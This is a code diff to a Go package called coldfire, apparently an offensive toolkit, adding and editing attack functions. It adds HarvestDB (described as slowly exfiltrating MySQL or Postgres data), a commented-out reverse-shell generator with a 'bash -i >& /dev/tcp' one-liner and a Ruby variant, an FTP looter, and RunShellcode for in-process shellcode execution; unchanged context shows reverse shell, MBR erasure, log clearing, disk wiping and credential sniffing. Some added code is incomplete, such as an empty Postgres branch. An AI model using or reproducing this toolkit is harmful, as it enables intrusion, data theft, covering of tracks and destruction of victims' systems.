@@ -5,7 +5,6 @@ package coldfire
 
 import (
 	"bufio"
-	"bytes"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -16,10 +15,14 @@ import (
 	"strconv"
 	"strings"
 	"time"
+    "database/sql"
 
+    _ "github.com/lib/pq"
 	"github.com/fatih/color"
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/pcap"
+	"github.com/GeertJohan/yubigo"
+    _ "github.com/go-sql-driver/mysql"
+	//"github.com/secsy/goftp"
+	"github.com/ztrue/tracerr"
 )
 
 var (
@@ -29,6 +32,7 @@ var (
 	Bold    = color.New(color.Bold).SprintFunc()
 	Yellow  = color.New(color.FgYellow).SprintFunc()
 	Magenta = color.New(color.FgMagenta).SprintFunc()
+	tmpbuf []byte 
 )
 
 func handleReverse(conn net.Conn) {
@@ -67,46 +71,115 @@ func getNTPTime() time.Time {
 func PrintGood(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s \n", Green(t), Green(Bold("[+]")), msg)
+	fmt.Printf("[%s] ~ %s \n", Green(t), msg)
 }
 
 // PrintInfo is used to print output containing information.
 func PrintInfo(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] [*] :: %s\n", t, msg)
+	fmt.Printf("[%s] ~ %s\n", t, msg)
 }
 
 // PrintError is used to print output indicating failure.
 func PrintError(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s \n", Red(t), Red(Bold("[x]")), msg)
+	fmt.Printf("[%s] ~ %s \n", Red(t), msg)
 }
 
 // PrintWarning is used to print output indicating potential failure.
 func PrintWarning(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s \n", Yellow(t), Yellow(Bold("[!]")), msg)
+	fmt.Printf("[%s] - %s \n", Yellow(t), msg)
 }
 
-// FileToSlice reads a textfile and returns all lines as an array.
-func FileToSlice(file string) []string {
-	fil, _ := os.Open(file)
-	defer fil.Close()
-	var lines []string
-	scanner := bufio.NewScanner(fil)
-	for scanner.Scan() {
-		lines = append(lines, scanner.Text())
+// Returns true if a file is executable
+func IsFileExec(file string) bool {
+	inf, err := os.Stat(file)
+	Check(err)
+	mode := inf.Mode()
+	return mode&0111 != 0
+}
+
+
+// Exfiltrates data slowly from either MySQL or Postgres
+func HarvestDB(ip, username, password string, port int){
+	if PortscanSingle(ip, 5400){
+
 	}
-	return lines
+	if PortscanSingle(ip, 3306){
+		db, err := sql.Open("mysql", F("%s:%s@tcp(%s:3306)/test", username, password, ip))
+		Check(err)
+		defer db.Close()
+	}
 }
 
-// Alloc allocates memory without use.
+// Lists remote SQL databases
+func ListDB(db *sql.DB, tables bool) []string {
+	res, err := db.Query("SHOW DATABASES")
+	if tables {
+		res, err = db.Query("SHOW TABLES")
+	}
+	Check(err)
+	var result []string
+	var table string
+	for res.Next() {
+    	res.Scan(&table)
+    	result = append(result, table)
+	}
+	return result
+}
+
+// Generates a reverse shell in a given language to the current machine on arbitrary port
+/*func LangRevshell(language string, port int, global bool) string {
+	reverse_addr := GetLocalIP()
+	if (global){
+		reverse_addr = GetGlobalIP()	
+	}
+	rshell := ""
+	switch (language){
+	case "rb":
+		rshell = F("require 'socket';spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))", reverse_addr, port)
+	case "sh":
+		rshell = F("bash -i >& /dev/tcp/%s/%d 0>&1", reverse_addr, port)
+	}
+	return rshell
+}
+
+// Ta funkcja wpierdala gratisa na FTP
+func Gratis(ip, username, password string, port int) {
+    config := goftp.Config{
+        User:               username,
+        Password:           password,
+        ConnectionsPerHost: port,
+        Timeout:            20 * time.Second,
+        Logger:             os.Stderr,
+    }
+    connection, err := goftp.DialConfig(config, ip)
+	Check(err)
+	listing, err := connection.ReadDir("/")
+	Check(err)
+    for _, file := range listing {
+        _ = file.Name()
+    }
+}*/
+
+// Verifies Yubico OTP
+func Yubi(id, token, otp string) bool {
+	yubikey, err := yubigo.NewYubiAuth(id, token)
+	Check(err)
+	res, ok, err := yubikey.Verify(otp)
+	if (err != nil || ! ok || res == nil) {
+		return false
+	}
+	return true
+}
+
+// Allocates anonymous memory without using it.
 func Alloc(size string) {
-	// won't this be immidiatly garbage collected?
-	_ = make([]byte, SizeToBytes(size))
+	tmpbuf = make([]byte, Size2Bytes(size))
 }
 
 // GenCpuLoad gives the Cpu work to do by spawning goroutines.
@@ -139,6 +212,16 @@ func ExitOnError(e error) {
 	if e != nil {
 		PrintError(e.Error())
 		os.Exit(0)
+	}
+}
+
+// Basic error handilng and reporting
+// Similar to exitOnError() but more verbose and does not exit
+func Check(e error) {
+	u, _ := GetUser()
+	if e != nil {
+		fmt.Println(F("I am sorry %s, I'm afraid I can't do that", u))
+		tracerr.PrintSourceColor(e)
 	}
 }
 
@@ -176,7 +259,7 @@ func Remove() {
 
 // CredentialsSniff is used to sniff network traffic for
 // private user information.
-func CredentialsSniff(ifac, interval string,
+/*func CredentialsSniff(ifac, interval string,
 	collector chan string,
 	words []string) error {
 	ifs := []string{}
@@ -217,7 +300,7 @@ func CredentialsSniff(ifac, interval string,
 		}
 	}
 	return nil
-}
+}*/
 
 // Reverse initiates a reverse shell to a given host:port.
 func Reverse(host string, port int) {
@@ -265,20 +348,18 @@ func EraseMbr(device string, partition_table bool) error {
 	return nil
 }
 
-// ClearLogs removes logfiles within the machine.
+// Removes logfiles within the machine.
 func ClearLogs() error {
 	return clearLogs()
 }
 
-// Wipe deletes all data in the machine.
+// Deletes all data in the machine.
 func Wipe() error {
 	return wipe()
 }
 
-// CreateUser creates a user with a given username and password.
-// TODO
 
-// RegexMatch checks if a string contains valuable information through regex.
+// Checks if a string contains valuable information through regex.
 func RegexMatch(regex_type, str string) bool {
 	regexes := map[string]string{
 		"mail":   "^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$",
@@ -295,4 +376,18 @@ func RegexMatch(regex_type, str string) bool {
 	matches := r.FindAllString(str, -1)
 
 	return len(matches) != 0
+}
+
+// Launches live documentation of the library on port 8080 or arbitrary
+func AutoDoc(port ...int) {
+	docport := 8080
+	if len(port) > 0 {
+		docport = port[0]
+	}
+	CmdRun(F("godoc -http=:%d", docport))
+}
+
+// Injects a bytearray into current process and executes it
+func RunShellcode(sc []byte, bg bool){
+	runShellcode(sc, bg)
 }
